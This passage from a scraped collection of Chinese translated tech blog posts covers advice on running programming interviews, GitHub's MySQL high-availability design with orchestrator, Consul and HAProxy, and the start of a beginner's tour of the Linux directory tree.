一职位）。在这种情况下，考虑采用多重的面试方法，其中关键在于你要很大程度上保证每种面试方法都是完全规范化的，我们在Triplebyte上就在这样做。我们发现你仅需问每个求职申请者他们所青睐的面试方法即可。7.不要因为资历而小看别人资历不是没用的，毕业于麻省理工或者斯坦福的，抑或在谷歌和苹果公司工作过的工程师组建的队伍确实要比没这些资历的工程师更加优秀，但问题是绝大多数工程师（包括我自己）都没有以上资历，所以如果一个公司对此过分看重，那他们就会错失大多数编程大牛。在筛选环节将申请人的资历纳入考量范围并非毫无道理。我们在Triplebyte上没这么做（我们的考评是100%不看背景的），但是在筛选时对申请人的资历做一定的参考可能会有用。但是若让资历问题影响最终面试结果，那就没有道理了，数据表明这种情况确有发生。在我们不看背景进行考评的过程中，对于表现情况一定的求职申请者，那些简历上写有名校文凭的要在比没有名校文凭的人过关率高30%。如果面试官知道求职申请者手握麻省理工的文凭，那他们就更愿意原谅他们在面试环节暴露出来的一些瑕疵。这就是你应该避免的干扰，最显而易见的解决方式就是在开始面试前直接跳过申请者简历上的学校和公司名，有些求职申请者可能会提到他们的学校或公司，但是我们的面试都不看申请者的背景，而且在进行技术考评时，申请者自己提背景的情况也是相当少见的。8.避免羞辱面试失败的最丑恶的一种情况，就是招聘人员表现出一种羞辱的态度。他们不仅是对求职者技能进行考评的人，而且也代表即将要纳入成员的一个组或一支团队，在第二种身份下，面试是迎接新成员的重要仪式。面试确实让人有压力，很恐怖，但我们都会背负面试压力，所以求职者也自然会有压力，尤其在求职者表现不佳时，面试压力会更加凸显出来。当面试官看到求职者对着答案看上去那么显而易见的问题，就是答不出来急得砸脑袋时，就会觉得大失所望，气不打一处来，同时又万分沮丧，这样无疑会让求职者压力更大，形成恶性循环。一般这种情况面试官唯恐避之不及，为此应该展开探讨，并且对面试官进行培训。我们用的一个策略是，当求职者表现很差劲时，就将想要对其进行考评的评估模式切换成想要让其理解问题正解的教学模式。心理上的这种切换大有裨益，当你采用教学模式时，你就没有理由硬忍住不说答案了，也会变得完全亲和友善。9.根据最高技能，而非平均或最低技能做录用决定迄今为止，我只探讨过单独的问题，却没有谈过最终的面试决策。我的建议：在做录用决定时应看求职者（在你所关心的技能中）具备的最高水平技能，而非中等或最低水平技能。无论是有意还是无意，你们好像就是这么做的。每个面试过求职者的面试官通过聚在一起开会，来制定最终的录用/淘汰决定。在至少有一人力挺，且没有人强烈反对的情况下，求职申请者就会被录用。要想让一人力挺，求职申请者就需要主攻面试的其中一个部分，大显身手。我们的数据显示，要在公司面试的至少其中一个部分表现优异，求职者具备的最高技能就是最紧密的影响因素了。然而，为了得到offer，求职者也需要保证没有强烈反对的声音，而若回答问题时表现得非常愚蠢，那么就不会引发强烈的反对。这里我们会发现大量的干扰，技术高明的工程师具备的能力各式各样，因而几乎不可能有求职者能驾驭所有技能。这就意味着如果你问了一个正确的（或错误的）问题，任何工程师都有可能出丑。那么求职者至少在一次面试中，体现了在一方面的优势（最高技能），且没有暴露在某些方面的明显劣势，才能获得offer，而这里就有干扰出现。如同一个工程师在回答有关网络系统的面试问题时表现不好而遭到淘汰，但却在另一个面试中成绩优异，只因为面试没出网络系统的问题。我认为最好的解决方法就是让公司专注于求职者的最高技能，同时对于面试中部分环节表现不佳的人也能通融给过。这就是说，寻找充分的理由去录用，而不要因为求职申请者在某些技术领域能力薄弱的而过分担心。我不想表现得过于绝对，当然有些领域对公司是至关重要的。而且对于企业文化，若团队中每个人在特定的领域都有特定的定位，那很可能大有裨益，但是将更多的注意力集中于最高技能着实可以减少面试中的干扰。到底为什么要搞面试？我应该回答的最后一个问题是为什么要搞面试？我确信有些读者已经咬牙切齿地问“对一个破败的系统想那么多干嘛？直接用带回家的项目进行考评不就行了！或者直接采取试用呗！”毕竟，一些非常成功的企业都会进行试用（求职者在团队中待一周），或者用带回家的项目取代当面面试。试用是很有意义的，几乎可以肯定的是，让他们花一周的时间跟在一个工程师旁边工作（或者看他们是如何完成一个实际的项目的），要比让他们回答1小时的面试问题更能反映能力。然而，有两个问题导致试用一直无法取代标准面试：1.要进行试用的话，公司要承受高昂成本，没有公司能为每个求职申请者承担整整一周的试用花销。因而公司必须采用其他的面试环节来决定试用的人选。2.试用（以及大型的带回家完成的项目）对求职者而言成本高昂，即使他们能获得报酬，那也未必有空参与。比如一个工程师的工作是全职的，就可能没法抽空干别的，而且就算能抽出时间，可能也不愿意。而且如果一个工程师已经获得了一些offer，那就不太可能再甘愿承受结果还充满不确定性的试用考验了，这一现象明显能从Tripletype上的求职者中看到。许多最优秀的求职申请者（拥有其他公司的offer）只是单纯不做大型项目或者不经受试用考验。试用是一种选人的绝佳方式。我认为如果你有开展试用的经济实力，那么加上试用这种选人方式是很不错的。但要想让这取代技术面试，并不完全可行。了解工程师过去的开发经历也可以成为取代技术面试的一种方式。逻辑上来看，通过了解他们过去的开发情况，就可以推知他们未来是否可以将工作干得得心应手。遗憾的是，我们在Triplebyte上实行此方法时，收效甚微。表达能力（推销自己的能力）强的到头来要比技术能力强的人更有胜算，巧舌如簧的工程师对自己的职能夸夸其谈（将整个团队的功劳独吞），谦虚谨慎的工程师却对自己的成绩轻描淡写，这样的现象屡见不鲜。如果有充分的时间和大量的问题去刨根究底，就有可能弄清楚真实情况，但是我们发现，常规面试时间有限，谈论过去的开发经历通常并不能取代技术面试。虽然谈过去经历有助于破冰，拉近和求职申请者间的关系，能够对他们的兴趣有所了解，（而且能从中评判求职者的表达能力，还有可能看出他和企业的的文化契合度），但要想让这取代技术面试，并不完全可行。编程面试的好处！我想让这篇博客以更加乐观的角度作结，无论面试存在多大的问题，但采用这种方法其实也有颇多好处。面试是对申请者能力的直接评估，我有一些朋友是当老师的，他们告诉我教师面试基本上考察的是语言表达能力（推销自己的能力）和所具备的文凭资历，这一点似乎从很多职业中都能得到印证。硅谷没有非常完美的精英体制，但我们至少确实在设法对申请者应具备的重要能力进行直接衡量，并且秉持达观开放的思想，认为一个人无论背景如何，只要具备相应的能力，就能够成为非常优秀的工程师。对文凭资历的偏见会成为贯彻这种思想的阻力，但我们在Triplebyte上已经很大程度上克服了这种偏见，并帮助很多没有常规资历的人找到了很好的技术工作。我认为Triplebyte不太可能解决比如在法律层面的问题，因为社会对于求职者文凭资历实在是太重视了。程序员同时也在选择面试形式。尽管这个话题颇有争议（当然有程序员对此持异议），但我们提供了各式各样不同的考评形式，通过试验，我们发现绝大多数的程序员还是会挑选常规的面试形式，仅有一小部分人会对公司采用试用或带回家的项目进行考评的形式更感兴趣。无论怎样，我们这里要说的是编程面试，其他形式的考评都能作为很好的补充备选，但看起来不太可能取代面试成为考评工程师的主要形式。不确切地套用丘吉尔的一句话：“面试是最差的一种考评工程师的方式，但它是我们迄今为止所能找到的最好的一种方式。”结论面试工作很难，无奈的是人类都是复杂的。从某种程度上来说，想要靠区区几小时的面试去评判一个人的能力，这是傻子才会干的事，因而我觉得保持谦逊的态度是至关重要的。任何面试在很多时候都注定会失败，只是因为人实在是太复杂了。但这并不是说着我们应该放弃，试着将面试过程不断优化要比什么都不做好得多。在Triplebyte上，面试就是我们的产品，我们集体讨论，想出考评测试方法，进而随着时间的推移不断优化面试方式。我在这篇博客中分享了过去两年多学到的一些重点，期待反馈，想知道这些观点是否能够让大家受益。1赞4收藏评论关于作者：dimple11简介还没来得及写:）个人主页·我的文章·15", "url_object_id": "7eac33cc1db7f0b9050885470a418bae"},{"title": "GitHub 的 MySQL 高可用性实践分享", "url": "http://blog.jobbole.com/114200/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "praise_nums": 2, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,9, ,·", "content": "原文出处：shlomi-noach译文出处：oschinaGitHub使用MySQL作为所有非git仓库数据的主要存储,它的可用性对GitHub的访问操作至关重要。GitHub站点本身、GitHub的API、身份验证等等都需要进行数据库访问。我们运行着多个MySQL集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置,主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改,并提供数据的读取服务。主节点的可用性尤为重要。没有主服务器,集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。本文将介绍GitHub的MySQL高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。高可用目标本文描述的解决方案，迭代并改进了之前在GitHub实现的高可用(HA)解决方案。随着规模的扩大，MySQL的高可用策略必须适应变化。我们希望为GitHub中的MySQL和其他服务，提供类似的高可用策略。在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：你能容忍多长的中断时间？崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？故障转移的可靠性如何？什么情况下可以失败？解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？解决方案是否允许一个完整的数据中心故障或者出现网络隔离？有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。你能允许数据丢失吗？在多大程度上？为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。移除基于VIP和DNS的服务发现在之前的迭代版本中，我们：使用orchestrator来做检测和故障转移使用VIP和DNS做主节点的发现在这个迭代版本中，客户端使用名字服务（比如mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟IP(VIP)，这个VIP指向主节点。因此，在正常情况下，客户端只需要解析名称，连接到解析后的IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。考虑这个跨越三个不同数据中心的复制拓扑：当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。orchestrator将会检测到故障，选举出一个新的主节点，然后重新分配name（名称）和VIP（虚拟IP）。客户端实际上并不知道主节点的真实身份：它们只知道name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：VIP是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放VIP，服务器必须发送ARP请求。拥有VIP的服务器必须在新提升的主节点获得VIP之前先释放掉。这还有一些额外的影响：有秩序的故障转移操作会首先通知故障主节点并要求它释放VIP，然后再通知新提升的主节点并要求它获取VIP。如果无法通知到原主节点或者拒绝释放VIP怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。事实源于两个独立服务器间的协作，并且这个设置是不可靠的。即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。即使VIP发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。VIP受限于物理位置。它们属于交换机或者路由器。所以，我们只能将VIP重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配VIP，只能修改DNS。修改DNS需要较长的传播时间。根据配置，客户端会缓存DNS一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：主节点通过pt-heartbeat心跳服务进行自行注入，目的是测量延迟和节流。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。同样的，Pseudo-GTID注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。新的主节点被设为可写。如果可能的话，原主节点被设为只读。这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。该解决方案生效了，GitHub已经成功完成MySQL的故障迁移，但我们希望我们的HA在以下方面有所改进：数据中心不可知允许数据中心出现故障删除不可靠的协作工作流减少总的中断时间尽可能地进行无损故障转移GitHub的高可用解决方案：orchestrator,Consul,GLB我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：使用orchestrator来做监测和故障转移。我们使用跨数据中心的orchestrator/raft方案，如下图。使用Hashicorp的Consul来做服务发现。使用GLB/HAProxy作为客户端和写节点的代理层。使用选播(anycast)做网络路由。新的设置将完全删除VIP和DNS的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。正常流程正常情况下，应用程序通过GLB/HAProxy连接到写节点。应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1的主节点命名为mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(anycast)IP。使用选播时，名字在任何地方都被解析为相同的IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有GLB（我们的高可用负载均衡）被部署在不同的容器中。指向mysql-writer-1.github.net的流量总是路由到本地数据中心的GLB集群。因此，所有客户端都由本地代理提供服务。我们在HAProxy上运行GLB。我们的HAProxy维护了一个写连接池：每个MySQL集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC中的所有GLB/HAProxy容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入mysql-writer-1.github.net，它连接到哪个GLB服务器并不重要。它总会被路由到实际的cluster1主节点上。对于应用程序而言，服务发现结束于GLB，并且不再需要重新发现。就这样，通过GLB将流量路由到正确地址。GLB如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到GBL呢？Consul的服务发现Consul是著名的服务发现解决方案，它也提供DNS服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。在Consul的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主FQDN，端口，IPV4，IPV6。每一个GLB/HAProxy节点都运行consul模板：每一个服务都在监听consul数据的变更（这里主要是对集群主控的数据变更）。consul模板会生成一个有效的配置文件并且当配置变更时，能够自动重载HAProxy。因此，Consul中主控标识的变更会被每一个GLB/HAProxy观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。在GitHub中，每一个数据中心都有一个Consul设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。那么Consul是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？orchestrator/raft运行一个orchestrator/raft设置：orchestrator节点之间通过raft一致性算法进行通信。每一个数据中心有1~2个orchestrator节点。orchestrator负责失败检测，MySQL故障转移，以及Consul主控的变更通知。故障转移通过单个orchestrator/raft主导节点进行操作，但是对于主控变更，产生新主控的消息会通过raft机制被传播到所有orchestrator节点。一旦orchestrator节点接收到主控变更的消息，它们会与自己对应的本地Consul设置通信：它们都执行KV写操作。具有多个orchestrator节点的数据中心会有多个完全相同的Consul写操作。整体流程在主节点故障的场景中：orchestrator节点检测到故障。orchestrator/raft主导节点开始恢复。一个新的主节点被设置为promoted状态。orchestrator/raft向所有raft集群节点通知主节点变更。所有orchestrator/raft成员接收到主节点变更的通知。每个成员都向本地Consul写入包含新主节点身份的KV记录。每个GLB/HAProxy都运行一个consul模版，用于监视ConsulKV存储的变化，并重新配置和重新加载HAProxy。客户端流量被重定向到新的主节点上。每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator不需要知道负载均衡。Consul不需要知道这些信息是从哪里来的。代理只关心Consul，客户端只关心代理。而且：没有DNS的变更需要传播。没有TTL。整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。其他细节为了进一步确保流程的安全，我们还提供了以下内容：将HAProxy的配置项hard-stop-after设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。通过使用hard-stop-after配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。我们并不严格要求Consul随时可用。实际上，我们只需要它在故障转移期间可用。如果Consul恰好这时不可用，GLB将继续使用已知的信息运作，不采用任何极端的行动。GLB被用于验证新提升的主节点的身份。类似于我们的context-awareMySQLpools（上下文感知的MySQL线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在Consul中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在Consul中错误的写入了一个非主节点的名称，没有问题；GLB将拒绝更新它并以最后已知的状态继续运行。我们会在以下章节进一步完成备受关注和期望的高可用目标。orchestrator/raft失败检测orchestrator使用全面方法来检测失败，因此这种方法非常可靠。我们不会观察到误报——因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。通过完全的DC网络隔离（又称DC栅栏），orchestrator/raft进一步处理这个问题。一个DC网络隔离会引起一些混淆：这个DC中的服务器是可以互相通信的。他们是与其他DC网络隔离，还是其他DC被网络隔离？在一个orchestrator/raft设置中，raft的leader节点就是运行故障转移的那个节点。leader是取得了大多数节点支持的节点（特定数量）。我们的orchestrator节点部署就是这样，没有单一数据中心可以占大多数，任何n-1的DC也是如此。在一个完全DC网络隔离的事件中，这个DC的orchestrator节点与其它DC中的对应节点失去连接。最终，隔离DC中的orchestrator节点不能作为raft集群的leader节点。如果任何这种节点碰巧成为了leader节点，它就会退出。一个新的leader节点可以从任何一个其他DC分配。leader节点会得到其他所有DC的支持，这些DC彼此之间可以进行通信。因此，调用shots的orchestrator节点将位于网络隔离数据中心之外。一个隔离DC应该有一个主服务器，orchestrator会使用可用DC中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离DC中的那些节点来做这个决定，以此来缓解DC隔离。更快的公告通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？当orchestrator开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且认为服务器可以将它所有的版本视为复本。在这个例子中orchestrator首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了ConsulKV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。有可能当我们的GLB服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！半同步复制在MySQL的半同步复制中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地DC副本，通常也发送到远程DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。我们在本地DC副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的DC故障进行无损故障转移的代价很高昂，我们并不期待这么做。在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的试验中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。心跳注入我们没有在已提升/已降级的主设备上管理pt-heartbeat服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些补丁，以便使pt-heartbeat可以支持服务器端来回更改它们的read_only状态或其完全崩溃。在我们目前的设置中，在主服务器及其副本上运行pt-heartbeat服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的pt-heartbeat会将服务器标识为可写，并开始注入心跳事件。orchestrator所有权委托我们进一步委托到orchestrator：伪-GTID注入设置被提升的主控作为可写的，清除它的复写状态如果可能，设置老的主控为只读状态对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让orchestrator直接应用变更到被晋升的主控上也应该是合理的。限制和缺点代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。随着分布式系统的发展，我们仍然遗留了未处理的场景。值得注意的是，在数据中心隔离场景中，假设主服务器位于DC中，DC中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的DC中，通过实现一个可靠的STONITH来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。更多的场景存在：故障转移时Consul的终端；部分DC隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。结果orchestrator/GLB/Consul设置给我们提供以下功能：可靠的故障检测数据中心不可知的故障迁移典型的无损故障迁移对数据中心网络隔离的支持缓解脑裂的问题（仍在实现中）无合作相关的依赖多数场景下大约10~13秒的断电恢复能力。（我们观察到一些场景下最长20秒的断电恢复和极端场景下最长25秒的情况）结语编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。2赞2收藏评论", "url_object_id": "b88c57937f3bff3e9546fbbb3ad0988e"},{"title": "Linux 文件系统详解", "url": "http://blog.jobbole.com/114189/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,0,2, ,·", "content": "原文出处：PaulBrown译文出处：Linux中国/amwps290这篇教程将帮你快速了解Linux文件系统。早在1996年，在真正理解文件系统的结构之前，我就学会了如何在我崭新的Linux上安装软件。这是一个问题，但对程序来说不是大问题，因为即使我不知道实际的可执行文件在哪里，它们也会神奇地工作。问题在于文档。你知道，那时候，Linux不是像今天这样直观、用户友好的系统。你必须读很多东西。你必须知道你的CRT显示器的扫描频率以及拨号调制解调器的噪音来龙去脉，以及其他数以百计的事情。我很快就意识到我需要花一些时间来掌握目录的组织方式以及/etc（不是用于“其它”文件），/usr（不是用于“用户”文件）和/bin（不是“垃圾桶”）的意思。本教程将帮助你比我当时更快地了解这些。结构从终端窗口探索Linux文件系统是有道理的，这并不是因为作者是一个脾气暴躁的老人，并且对新孩子和他们漂亮的图形工具不以为然（尽管某些事实如此），而是因为终端，尽管只是文本界面，才是更好地显示Linux目录树结构的工具。事实上，帮助你了解这一切的、应该首先安装的第一个工具的名为：tree。如果你正在使用Ubuntu或Debian，你可以：sudoaptinstalltree12sudoaptinstalltree在RedHat或Fedora:sudodnfinstalltree12sudodnfinstalltree对于SUSE/openSUSE可以使用zypper：sudozypperinstalltree12sudozypperinstalltree对于使用Arch（Manjaro，Antergos，等等）使用：sudopacman-Stree12sudopacman-Stree……等等。一旦安装好，在终端窗口运行tree命令：tree/12tree/上述指令中的/指的是根目录。系统中的其他目录都是从根目录分支而出，当你运行tree命令，并且告诉它从根目录开始，那么你就可以看到整个目录树，系统中的所有目录及其子目录，还有它们的文件。如果你已经使用你的系统有一段时间了，这可能需要一段时间，因为即使你自己还没有生成很多文件，Linux系统及其应用程序总是在记录、缓存和存储各种临时文件。文件系统中的条目数量会快速增长。不过，不要感到不知所措。相反，试试这个：tree-L1/12tree-L1/你应该看到如图1所示。tree上面的指令可以翻译为“只显示以/（根目录）开头的目录树的第一级”。-L选项告诉树你想看到多少层目录。大多数Linux发行版都会向你显示与你在上图中看到的相同或非常类似的结构。这意味着，即使你现在感到困惑，掌握这一点，你将掌握大部分（如果不是全部的话）全世界的Linux文件系统。为了让你开始走上掌控之路，让我们看看每个目录的用途。当我们查看每一个目录的时候，你可以使用ls来查看他们的内容。目录从上到下，你所看到的目录如下/bin/bin目录是包含一些二进制文件的目录，即可以运行的一些应用程序。你会在这个目录中找到上面提到的ls程序，以及用于新建和删除文件和目录、移动它们基本工具。还有其它一些程序，等等。文件系统树的其他部分有更多的bin目录，但我们将在一会儿讨论这些目录。/boot/boot目录包含启动系统所需的文件。我必须要说吗？好吧，我会说：不要动它！如果你在这里弄乱了其中一个文件，你可能无法运行你的Linux，修复被破坏的系统是非常痛苦的一件事。另一方面，不要太担心无意中破坏系统：你必须拥有超级用户权限才能执行此操作。/dev/dev目录包含设备文件。其中许多是在启动时或甚至在运行时生成的。例如，如果你将新的网络摄像头或USB随身碟连接到你的机器中，则会自动弹出一个新的设备条目。/etc/etc的目录名称会让人变得非常的困惑。/etc得名于最早的Unix系统们，它的字面意思是“etcetera”（诸如此类），因为它是系统文件管理员不确定在哪里放置的文件的垃圾场。现在，说/etc是“要配置的所有内容EverythingToConfigure”更为恰当，因为它包含大部分（如果不是全部的话）的系统配置文件。例如，包含系统名称、用户及其密码、网络上计算机名称以及硬盘上分区的安装位置和时间的文件都在这里。再说一遍，如果你是Linux的新手，最好是不要在这里接触太多，直到你对系统的工作有更好的理解。/home/home是你可以找到用户个人目录的地方。在我的情况下，/home下有两个目录：/home/paul，其中包含我所有的东西；另外一个目录是/home/guest目录，以防有客人需要使用我的电脑。/lib/lib是库文件所在的地方。库是包含应用程序可以使用的代码文件。它们包含应用程序用于在桌面上绘制窗口、控制外围设备或将文件发送到硬盘的代码片段。在文件系统周围散布着更多的lib目录，但是这个直接挂载在/的/lib目录是特殊的，除此之外，它包含了所有重要的内核模块。内核模块是使你的显卡、声卡、WiFi、打印机等工作的驱动程序。/media在/media目录中，当你插入外部存储器试图访问它时，将自动挂载它。与此列表中的大多数其他项目不同，/media并不追溯到1970年代，主要是因为当计算机正在运行而动态地插入和检测存储（U盘、USB硬盘、SD卡、外部SSD等)，这是近些年才发生的事。/mnt然而，/mnt目录是一些过去的残余。这是你手动挂载存储设备或分区的地方。现在不常用了。/opt/opt目录通常是你编译软件（即，你从源代码构建，并不是从你的系统的软件库中安装软件）的地方。应用程序最终会出现在/opt/bin目录，库会在/opt/lib目录中出现。稍微的题外话：应用程序和库的另一个地方是/usr/local，在这里安装软件时，也会有/usr/local/bin和/usr/local/lib目录。开发人员如何配置文件来控制编译和安装过程，这就决定了软件安装到哪个地方。/proc/proc，就像/dev是一个虚拟目录。它包含有关你的计算机的信息，例如关于你的CPU和你的Linux系统正在运行的内核的信息。与/dev一样，文件和目录是在计算机启动或运行时生成的，因为你的系统正在运行且会发生变化。/root/root是系统的超级用户（也称为“管理员”）的主目录。它与其他用户的主目录是分开的，因为你不应该动它。所以把自己的东西放在你自己的目录中，伙计们。/run/run是另一个新出现的目录。系统进程出于自己不可告人的原因使用它来存储临时数据。这是另一个不要动它的文件夹。/sbin/sbin与/bin类似，但它包含的应用程序只有超级用户（即首字母的s）才需要。你可以使用sudo命令使用这些应用程序，该命令暂时允许你在许多Linux发行版上拥有超级用户权限。/sbin目录通常包含可以安装、删除和格式化各种东西的工具。你可以想象，如果你使用不当，这些指令中有一些是致命的，所以要小心处理。/usr/usr目录是在UNIX早期用户的主目录所处的地方。然而，正如我们上面看到的，现在/home是用户保存他们的东西的地方。如今，/usr包含了大量目录，而这些目录又包含了应用程序、库、文档、壁纸、图标和许多其他需要应用程序和服务共享的内容。你还可以在/usr目录下找到bin，sbin，lib目录，它们与挂载到根目录下的那些有什么区别呢？现在的区别不是很大。在早期，/bin目录（挂载在根目录下的）只会包含一些基本的命令，例如ls、mv和rm；这是一些在安装系统的时候就会预装的一些命令，用于维护系统的一个基本的命令。而/usr/bin目录则包含了用户自己安装和用于工作的软件，例如文字处理器，浏览器和一些其他的软件。但是许多现代的Linux发行版只是把所有的东西都放到/usr/bin中，并让/bin指向/usr/bin，以防彻底删除它会破坏某些东西。因此，Debian、Ubuntu和Mint仍然保持/bin和/usr/bin（和/sbin和/usr/sbin）分离；其他的，比如Arch和它衍生版，只是有一个“真实”存储二进制程序的目录，/usr/bin，其余的任何bin目录是指向/usr/bin的“假”目录。/srv/srv目录包含服务器的数据。如果你正在Linux机器上运行Web服务器，你网站的HTML文件将放到/srv/http（或/srv/www）。如果你正在运行FTP服务器，则你的文件将放到/srv/ftp。/sys/sys是另一个类似/proc和/dev的虚拟目录，它还包含连接到计算机的设备的信息。在某些情况下，你还可以操纵这些设备。例如，我可以通过修改存储在/sys/devices/pci0000:00/0000:00:02.0/drm/card1/card1-eDP-1/intel_backlight/brightness中的值来更改笔记本电脑屏幕的亮度（在你的机器上你可能会有不同的文件）。但要做到这一点，你必须成为超级用户。原因是，与许多其它虚拟目录一样，在/sys中打乱内容和文件可能是危险的，你可能会破坏系统。直到你确信你知道你在做什么。否则不要动它。/tmp/tmp包含临时文件，通常由正在运行的应用程序放置。文件和目录通常（并非总是）包含应用程序现在不需要但以后可能需要的数据。你还可以使用/tmp来存储你自己的临时文件——/tmp是少数挂载到根目录下而你可以在不成为超级用户的情况下与它进行实际交互的目录之一。/var/var最初被如此命名是因为它的内容被认为是可变的variable，因为它经常变化。今天，它有点用词不当，因为还有许多其他目录也包含频繁更改的数据，特别是我们上面看到的虚拟目录。不管怎样，/var目录包含了放在/var/log子目录的日志文件之类。日志是记录系统中发生的事件的文件。如果内核中出现了什么问题，它将被记录到/var/log下的文件中；如果有人试图从外部侵入你的计算机，你的防火墙也将记录尝试。它还包含用于任务的假脱机程序。这些“任务”可以是你发送给共享打印机必须等待执行的任务，因为另一个用户正在打印一个长文档，或者是等待递交给系统上的用户的邮件。你